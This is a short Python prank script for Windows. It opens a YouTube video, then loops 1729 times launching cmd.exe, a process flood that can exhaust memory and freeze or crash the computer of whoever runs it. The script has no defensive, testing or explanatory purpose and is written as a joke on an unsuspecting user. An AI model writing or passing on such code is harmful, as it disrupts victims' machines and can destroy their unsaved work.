import webbrowser
import os

# have fun :)
webbrowser.open("https://www.youtube.com/watch?v=GtL1huin9EE")

# lol 
for i in range(1729):
    os.startfile("cmd.exe") 











